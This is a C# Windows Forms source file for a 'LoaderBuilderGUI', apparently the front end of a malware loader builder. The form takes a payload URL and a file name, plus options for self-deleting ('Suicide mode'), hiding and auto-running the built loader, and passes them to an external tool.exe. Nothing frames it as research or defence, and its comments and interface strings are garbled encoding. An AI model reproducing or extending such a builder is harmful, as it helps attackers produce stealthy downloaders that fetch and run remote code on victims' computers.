using System.Diagnostics;

namespace LoaderBuilderGUI
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        private void button1_Click(object sender, EventArgs e)
        { // �������� �������� ������
            // ������� �� ���
            string url = textBox1.Text;
            string namefile = textBox2.Text;
            // ����� �������� �� ���
            // ����� ���������� (��� ���) �� ���
            string suicide = "No";
            string run = "No";
            string compile = "No";
            string hide = "No";
            // ������ ����� (���)
            if (checkBox1.Checked == true)
            { // Suicide mode ���
                suicide = "Yes";
            }
            if (checkBox2.Checked == true)
            { // ����� �������, �� ������ ���� ��� �� ���� Hide mode
                hide = "Yes";
            }
            if (checkBox3.Checked == true)
            {  // ����� ��� ��������� ���� ��� ���������� �����
                run = "Yes";
            }
            if (checkBox4.Checked == true)
            { // ���� ���������� (������� �����)
                compile = "Yes";
            }
            var process = Process.Start(@"tool.exe ", namefile + " " + url + " " + compile + " " + suicide + " " + hide + " " + run);
            process.WaitForExit();
            MessageBox.Show("���� �������!\n��������� :\n������� ��� : " + suicide + "\n�������� ���� : " + hide + "\n��������� ���� : " + run + "\n�������������� : " + compile + "\n---------------------" + "\n������ : " + url + "\n��� ����� : " + namefile + "\n---------------------" + "\n�������� LoaderBuilderGUI");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("������ LoaderBuilderGUI\n������������� ������ : ��������������� ������ v0.3\n�������� : Ametero(z)");
        }

    }
}
